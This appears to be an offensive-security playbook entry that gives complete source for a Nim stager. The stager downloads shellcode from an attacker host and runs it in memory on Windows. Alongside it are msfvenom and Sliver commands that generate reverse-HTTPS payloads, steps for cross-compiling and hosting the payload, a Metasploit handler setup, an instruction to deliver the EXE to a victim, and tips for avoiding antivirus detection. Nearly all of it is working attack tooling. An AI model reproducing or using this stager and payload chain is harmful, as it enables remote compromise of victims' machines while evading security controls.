# 07.08 Nim Stager

> Build a Nim downloader executable that fetches and executes shellcode in-memory from an attacker URL.

## Overview

Nim compiles to native PE with low AV detection rates and links directly against the Win32 API via the winim library. This stager downloads raw shellcode bytes from <ATTACKER>, allocates RWX memory in the current process, copies the bytes in, and invokes them as a function. Because Nim is uncommon in production estates, signature-based AV often misses it entirely; combined with the small binary size (a few hundred KB), it makes an excellent first-stage payload. Cross-compilation from Linux to Windows is supported via mingw, so you can build the EXE on your attacker box.

## Steps

- **Step 1** — Install Nim on the attacker host (`curl https://nim-lang.org/choosenim/init.sh -sSf | sh` or `apt install nim`) and add `winim` package via `nimble install winim`.
- **Step 2** — Generate raw shellcode bytes with `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin` (or use Sliver `generate --format shellcode --mtls <ATTACKER>:8888`).
- **Step 3** — Edit the stager source: replace `192.168.122.42` (sample URL) with your attacker IP and adjust path if needed.
- **Step 4** — Compile with `nim c -d:release --opt:size --app:gui -d:strip stager.nim` for a small windowed PE. Cross-compile from Linux: `nim c -d:release -d:mingw stager.nim` (requires `apt install mingw-w64`).
- **Step 5** — Host the shellcode on the attacker box: `cd /tmp && python3 -m http.server 80` (or any web server).
- **Step 6** — Deliver the stager EXE to the victim. On execution it pulls the shellcode and runs it in the current process — no child process spawn, no file dropped beyond the stager itself.
- **Step 7** — Detection: stager EXE itself is small and rare-language-built so most AV misses it; the bigger signal is the HTTP/HTTPS connection to <ATTACKER>. Use TLS + a non-default port for stealth; consider DNS-over-HTTPS for harder-to-detect transport.

## Commands

### Install Nim and winim

```bash
# Attacker box (Kali/Linux)
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
export PATH=$HOME/.nimble/bin:$PATH
nimble install winim
sudo apt install mingw-w64  # for Linux→Windows cross-compile
```

### stager.nim — complete source

```nim
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://<ATTACKER>/shellc.bin")
```

### Generate shellcode payload (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin
# Or for a stageless beacon:
# msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin
```

### Generate Sliver shellcode (alternative)

```bash
sliver > generate --format shellcode --mtls <ATTACKER>:8888 --os windows --arch amd64 --save /tmp/shellc.bin
```

### Cross-compile Linux→Windows

```bash
# Native Windows build (run on Windows w/ Nim installed)
nim c -d:release --opt:size --app:gui -d:strip stager.nim

# Cross-compile from Kali Linux to Windows x64
nim c -d:release -d:mingw --cpu:amd64 -d:strip --opt:size --app:gui stager.nim
# Output: stager.exe (~250 KB)
```

### Host the shellcode (attacker box)

```bash
# Drop shellc.bin where the web server can serve it
sudo cp shellc.bin /var/www/html/
# Or quick one-liner web server:
cd /tmp && python3 -m http.server 80
# Verify: curl -o /dev/null -s -w "%{http_code}\n" http://<ATTACKER>/shellc.bin
```

### Run handler (Metasploit example)

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <ATTACKER>; set LPORT 443; set ExitOnSession false; exploit -j"
```

### Verify execution and check detection

```powershell
# On the victim, after running stager.exe — confirm beacon callback in your C2
# Check Windows Defender events for the EXE (Event Viewer → Microsoft → Windows → Windows Defender → Operational, Event ID 1116/1117)
# Hash the binary and search VirusTotal (use a test sample only, or skip if OPSEC):
Get-FileHash stager.exe -Algorithm SHA256
```
